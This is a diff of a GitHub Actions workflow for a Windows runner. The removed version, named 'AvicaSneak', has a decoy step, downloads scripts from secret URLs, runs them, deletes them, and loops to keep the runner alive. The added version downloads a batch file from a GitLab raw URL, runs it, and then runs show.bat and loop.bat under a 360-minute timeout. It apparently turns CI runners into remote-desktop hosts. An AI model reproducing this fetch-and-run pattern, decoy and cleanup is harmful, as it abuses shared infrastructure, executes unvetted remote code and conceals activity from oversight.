@@ -1,47 +1,22 @@
-name: AvicaSneak
+name: Avica
+
 on:
-  push:
-    branches: [main]
+  workflow_dispatch:
+
 jobs:
   build:
-    name: Build Process
+    name: Start Building...
     runs-on: windows-latest
-    timeout-minutes: 30
-    env:
-      SETUP_URL: ${{ secrets.SETUP_URL }}
-      SHOW_URL: ${{ secrets.SHOW_URL }}
-      WALL_URL: ${{ secrets.WALL_URL }}
-      TRANS_URL: ${{ secrets.TRANS_URL }}
-      CACHE_URL: ${{ secrets.CACHE_URL }}
+    timeout-minutes: 360
+    
     steps:
-      - name: Checkout Repo (Minimal)
-        uses: actions/checkout@v3
-      - name: Decoy Step
-        shell: powershell
+      - name: Downloading & Installing Essentials
         run: |
-          Write-Output "Running a normal build process, nothing shady here."
-          Get-ChildItem > build_log.txt
-      - name: Fetch and Run Setup
-        shell: powershell
-        run: |
-          # Download files from GitLab using secrets
-          Invoke-WebRequest -Uri $env:SETUP_URL -OutFile setup_temp.py
-          Invoke-WebRequest -Uri $env:SHOW_URL -OutFile show_temp.bat
-          Invoke-WebRequest -Uri $env:WALL_URL -OutFile wall_temp.bat
-          Invoke-WebRequest -Uri $env:TRANS_URL -OutFile TranscodedWallpaper
-          Invoke-WebRequest -Uri $env:CACHE_URL -OutFile CachedImage_1024_768_POS4.jpg
+          Invoke-WebRequest -Uri "https://gitlab.com/raposabrty/pcrdp/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
 
-          # Execute the setup
-          cmd.exe /c wall_temp.bat
-          cmd.exe /c show_temp.bat
-          python setup_temp.py
+      - name: Show Website
+        run: cmd /c show.bat
 
-          # Clean up
-          Remove-Item -Path setup_temp.py, show_temp.bat, wall_temp.bat, TranscodedWallpaper, CachedImage_1024_768_POS4.jpg
-      - name: Keep Alive
-        shell: cmd
-        run: |
-          :loop
-          echo Keeping runner active...
-          timeout /t 300
-          goto loop
+      - name: Time Counter
+        run: cmd /c loop.bat
